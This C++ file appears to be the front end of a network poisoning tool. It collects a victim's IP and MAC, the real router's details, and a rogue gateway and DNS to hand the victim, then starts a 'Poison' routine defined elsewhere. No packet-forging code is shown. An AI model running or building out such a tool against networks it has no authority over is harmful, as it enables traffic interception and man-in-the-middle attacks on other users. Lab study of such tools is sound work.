#include "include/poison.hpp"
#include <iostream>
#include <sstream>
#include <vector>

std::string getInputWithDefault(const std::string& prompt, const std::string& defaultValue) {
    std::cout << prompt << " [" << defaultValue << "]: ";
    std::string input;
    std::getline(std::cin, input);

    if (input.empty()) {
        return defaultValue;
    }
    return input;
}

bool parseMacAddress(const std::string& macStr, uint8_t mac[6]) {
    int values[6];
    if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }

    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)values[i];
    }
    return true;
}

std::vector<std::string> parseDNSServers(const std::string& dnsStr) {
    std::vector<std::string> dnsServers;
    std::stringstream ss(dnsStr);
    std::string server;

    while (std::getline(ss, server, ',')) {
        server.erase(0, server.find_first_not_of(" \t"));
        server.erase(server.find_last_not_of(" \t") + 1);
        if (!server.empty()) {
            dnsServers.push_back(server);
        }
    }

    return dnsServers;
}

int main() {
    std::string defaultInterface       = "wlan0";
    std::string defaultTargetIp        = "192.168.100.4";
    std::string defaultRouterIp        = "192.168.100.1";
    std::string defaultSubnet          = "255.255.255.0";
    std::string defaultBroadcast       = "192.168.100.255";
    std::string defaultIpToGive        = "192.168.100.33";
    std::string defaultGateway         = "192.168.100.118";
    std::string defaultDNSServers      = "8.8.8.8,8.8.4.4";
    std::string defaultDomainName      = "example.com";
    std::string defaultHostname        = "kali-host";
    std::string defaultTargetMac       = "08:00:27:78:69:d3";
    std::string defaultRouterMac       = "bc:99:30:95:9b:36";


    std::string interface       = getInputWithDefault("Network interface", defaultInterface);
    std::string targetIpStr     = getInputWithDefault("Target IP address", defaultTargetIp);
    std::string realRouterIpStr = getInputWithDefault("Real router IP address", defaultRouterIp);
    std::string subnetStr       = getInputWithDefault("Subnet mask", defaultSubnet);
    std::string broadcastStr    = getInputWithDefault("Broadcast address", defaultBroadcast);
    std::string ipToGiveStr     = getInputWithDefault("IP to give to target", defaultIpToGive);
    std::string gatewayStr      = getInputWithDefault("Gateway IP", defaultGateway);
    std::string dnsInput        = getInputWithDefault("DNS servers (comma-separated)", defaultDNSServers);
    std::string domainName      = getInputWithDefault("Domain name", defaultDomainName);
    std::string hostname        = getInputWithDefault("Hostname", defaultHostname);
    std::string targetMacStr    = getInputWithDefault("Target MAC address", defaultTargetMac);
    std::string routerMacStr    = getInputWithDefault("Router MAC address", defaultRouterMac);

    // Parse DNS servers
    std::vector<std::string> dnsServers = parseDNSServers(dnsInput);

    // Parse MAC addresses
    uint8_t targetMac[6];
    uint8_t routerMac[6];

    if (!parseMacAddress(targetMacStr, targetMac)) {
        std::cerr << "Error: Invalid target MAC address format. Use format: XX:XX:XX:XX:XX:XX\n";
        return 1;
    }

    if (!parseMacAddress(routerMacStr, routerMac)) {
        std::cerr << "Error: Invalid router MAC address format. Use format: XX:XX:XX:XX:XX:XX\n";
        return 1;
    }


    // Display configuration summary
    std::cout << "\n=== Configuration Summary ===\n";
    std::cout << "Interface: " << interface << "\n";
    std::cout << "Target IP: " << targetIpStr << " (MAC: " << targetMacStr << ")\n";
    std::cout << "Router IP: " << realRouterIpStr << " (MAC: " << routerMacStr << ")\n";
    std::cout << "Subnet: " << subnetStr << "\n";
    std::cout << "Broadcast: " << broadcastStr << "\n";
    std::cout << "IP to give: " << ipToGiveStr << "\n";
    std::cout << "Gateway: " << gatewayStr << "\n";
    std::cout << "DNS Servers: ";
    for (size_t i = 0; i < dnsServers.size(); i++) {
        std::cout << dnsServers[i];
        if (i < dnsServers.size() - 1) std::cout << ", ";
    }
    std::cout << "\n";
    std::cout << "Domain: " << domainName << "\n";
    std::cout << "Hostname: " << hostname << "\n";

    try {
        config cfg(interface, targetMac, routerMac,
                   targetIpStr, realRouterIpStr, subnetStr, broadcastStr,
                   gatewayStr, dnsServers, ipToGiveStr, domainName, hostname);

        Poison poisoner(cfg);
        poisoner.start();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    return 0;
}
